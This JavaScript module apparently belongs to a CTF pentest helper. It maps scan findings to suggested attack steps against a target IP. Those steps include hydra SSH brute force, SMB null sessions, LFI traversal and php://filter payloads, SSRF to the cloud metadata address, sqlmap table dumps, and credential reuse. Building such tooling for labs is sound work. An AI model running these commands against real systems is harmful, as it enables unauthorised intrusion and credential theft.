function safeToString(v) {
  return v == null ? '' : String(v);
}

function uniq(arr) {
  return [...new Set(arr.filter(Boolean))];
}

function parseNmapFindingValue(v) {
  // format: "tcp/22 ssh OpenSSH 8.2p1 ..." (criado no pipeline)
  const s = safeToString(v).trim();
  const m = s.match(/^(\w+)\/(\d+)\s+([^\s]+)/);
  if (!m) return null;
  return { proto: m[1].toLowerCase(), port: Number(m[2]), service: m[3].toLowerCase() };
}

export function buildCtfPlaybookSuggestions({ ip, findings }) {
  const suggestions = [];

  const nmap = (findings || []).filter((f) => f && f.type === 'nmap');
  const endpoints = (findings || []).filter((f) => f && (f.type === 'endpoint' || f.type === 'tech'));
  const params = (findings || []).filter((f) => f && f.type === 'param');
  const sqliFindings = (findings || []).filter((f) => f && f.type === 'sqli');
  const exploitFindings = (findings || []).filter((f) => f && f.type === 'exploit');
  const endpointFindings = (findings || []).filter((f) => f && f.type === 'endpoint');
  const techFindings = (findings || []).filter((f) => f && f.type === 'tech');

  const ports = [];
  for (const f of nmap) {
    const p = parseNmapFindingValue(f.value);
    if (p && Number.isFinite(p.port)) ports.push(p);
  }

  const openPortNums = uniq(ports.map((p) => p.port));
  const has = (port) => openPortNums.includes(port);

  const emit = (title, steps, prio = 'med') => {
    suggestions.push({
      prio,
      title,
      steps: Array.isArray(steps) ? steps : [String(steps)],
    });
  };

  // ── Network services ─────────────────────────────
  if (has(21) || ports.some((p) => p.service.includes('ftp'))) {
    emit('FTP (21) aberto → testar anonymous + enum', [
      `ftp ${ip}`,
      `# user: anonymous  pass: (vazio)`,
      `# listar: ls -la  baixar: get <ficheiro>`,
      `# se falhar, tenta: nmap -sV -p 21 --script "ftp-*" ${ip}`,
    ], 'high');
  }

  if (has(22) || ports.some((p) => p.service.includes('ssh'))) {
    emit('SSH (22) aberto → enum básica + brute force com limites', [
      `ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no ${ip}`,
      `# se tiver user(s): hydra -l <user> -P <wordlist> -s 22 -t 4 -W 3 ssh://${ip}`,
    ], 'med');
  }

  if (has(445) || has(139) || ports.some((p) => p.service.includes('microsoft-ds') || p.service.includes('netbios') || p.service.includes('smb'))) {
    emit('SMB (445/139) → enum shares + null session', [
      `smbclient -L //${ip} -N`,
      `smbmap -H ${ip} -u '' -p ''`,
      `enum4linux-ng ${ip}`,
      `# se tiver share: smbclient //${ip}/<share> -N`,
    ], 'high');
  }

  if (has(3306) || ports.some((p) => p.service.includes('mysql'))) {
    emit('MySQL (3306) → testar creds fracas / acesso remoto', [
      `mysql -h ${ip} -u root -p`,
      `nmap -sV -p 3306 --script "mysql-*" ${ip}`,
    ], 'med');
  }

  if (has(5432) || ports.some((p) => p.service.includes('postgres'))) {
    emit('PostgreSQL (5432) → testar enum/creds', [
      `psql "host=${ip} user=postgres dbname=postgres sslmode=disable"`,
      `nmap -sV -p 5432 --script "pgsql-*" ${ip}`,
    ], 'med');
  }

  if (has(6379) || ports.some((p) => p.service.includes('redis'))) {
    emit('Redis (6379) → testar acesso sem auth', [
      `redis-cli -h ${ip} ping`,
      `redis-cli -h ${ip} info`,
    ], 'high');
  }

  // ── Web hints ───────────────────────────────────
  const urls = uniq(endpoints.map((f) => f.url || '').filter((u) => /^https?:\/\//i.test(u)));
  if (urls.length) {
    emit('Web detectada → checklist rápido (CTF)', [
      `# headers: curl -sS -i -k ${urls[0]}`,
      `# robots/sitemap: /robots.txt /sitemap.xml`,
      `# procurar flag: view-source + grep Solyd{ / HTB{ / GCTF{`,
      `# dir enum: ffuf -u ${urls[0].replace(/\/$/, '')}/FUZZ -w <wordlist> -mc 200,204,301,302,307,401,403`,
    ], 'high');
  }

  // ── Param-based attacks (LFI/Traversal/SSRF/OpenRedirect) ──
  const paramBlob = params.map((p) => safeToString(p.value)).join(' ').toLowerCase();
  if (params.length) {
    emit('Parâmetros encontrados → testar LFI/Traversal/Redirect/SSRF', [
      `# LFI: ../../../../../etc/passwd  ..\\..\\..\\..\\windows\\win.ini`,
      `# wrappers PHP (se PHP): php://filter/convert.base64-encode/resource=index.php`,
      `# redirect/ssrf: url=http://127.0.0.1:80/  url=http://169.254.169.254/latest/meta-data/`,
    ], /file|path|page|include|template|load/i.test(paramBlob) ? 'high' : 'med');
  }

  // ── Contextual chains (dinâmico por achado) ─────────────
  const hasLfiHit = params.some((p) => /possível\s+lfi|lfi/i.test(`${p.value} ${p.meta}`));
  if (hasLfiHit) {
    emit('LFI detectado → cadeia de exploração sequencial', [
      '# confirmar leitura estável: /etc/passwd, /proc/self/environ, logs do webserver',
      '# procurar credenciais/config: .env, config.php, wp-config.php, settings.py',
      '# tentar wrappers (PHP): php://filter/convert.base64-encode/resource=<ficheiro>',
      '# procurar chaves/API tokens e reaproveitar em SSH/DB/painéis',
    ], 'high');
  }

  const hasSqlmapHit = sqliFindings.length > 0 || params.some((p) => /sqlmap|sqli|sql injection/i.test(`${p.value} ${p.meta}`));
  if (hasSqlmapHit) {
    emit('SQLMap hit → sequência recomendada (safe-to-deeper)', [
      '# confirmar vetor: sqlmap -u <url> -p <param> --batch --level=3 --risk=3 --current-user --current-db',
      '# enum DB: sqlmap -u <url> -p <param> --batch --dbs',
      '# enum tabelas da DB alvo: sqlmap -u <url> -p <param> --batch -D <db> --tables',
      '# dump seletivo (users/tokens/flags): sqlmap -u <url> -p <param> --batch -D <db> -T <tbl> --dump --where=\"id<50\"',
      '# se suportado: testar file-read/file-write com muita cautela (CTF only)',
    ], 'high');
  }

  const hasFtpAnonymous = endpointFindings.some((e) => /ftp anonymous permitido/i.test(`${e.value} ${e.meta}`));
  if (hasFtpAnonymous) {
    emit('FTP anonymous confirmado → sequência de enum + pivot', [
      `ftp ${ip}`,
      '# listar profundamente e baixar arquivos de config/backups/keys',
      '# procurar credenciais reaproveitáveis para SSH/MySQL/painéis web',
      '# verificar upload e possível webroot exposure (se aplicável)',
    ], 'high');
  }

  if (exploitFindings.length) {
    emit('Exploit-DB com matches → validar versão antes de executar', [
      '# confirmar versão real no serviço (banner/header/body) e reduzir falso positivo',
      '# reproduzir PoC em modo read-only/check primeiro',
      '# só depois escalar para payload de RCE se o cenário CTF permitir',
    ], 'med');
  }

  const wpBlob = [...techFindings, ...endpointFindings, ...params]
    .map((x) => `${safeToString(x.value)} ${safeToString(x.meta)}`.toLowerCase())
    .join(' ');
  const hasWp = /wordpress|wp-login|xml-rpc|xmlrpc|wp-json|wp user enum|plugin detectado|theme detectado/.test(wpBlob);
  if (hasWp) {
    emit('WordPress foco → cadeia orientada (plugins/users/xmlrpc)', [
      '# confirmar versão e plugins/tema detectados no output do framework',
      '# enum users: /wp-json/wp/v2/users e wp-login responses',
      '# validar xmlrpc exposto (e vetores associados) antes de brute force',
      '# mapear plugins para CVE por versão (priorizar plugins já detectados)',
      '# testar credential reuse (wp-login/ftp/ssh/mysql) com credenciais extraídas',
    ], 'high');
  }

  // fallback
  if (!suggestions.length) {
    emit('Sem playbook automático → próximos passos', [
      'Rever portas/serviços e identificar superfície web.',
      'Rodar enum (SMB/FTP) se aparecerem.',
      'Priorizar erros no HTTP (500/stack trace) e arquivos expostos.',
    ], 'low');
  }

  // dedupe by title
  const seen = new Set();
  const out = [];
  for (const s of suggestions) {
    const key = `${s.prio}|${s.title}`;
    if (seen.has(key)) continue;
    seen.add(key);
    out.push(s);
  }
  return out.slice(0, 30);
}

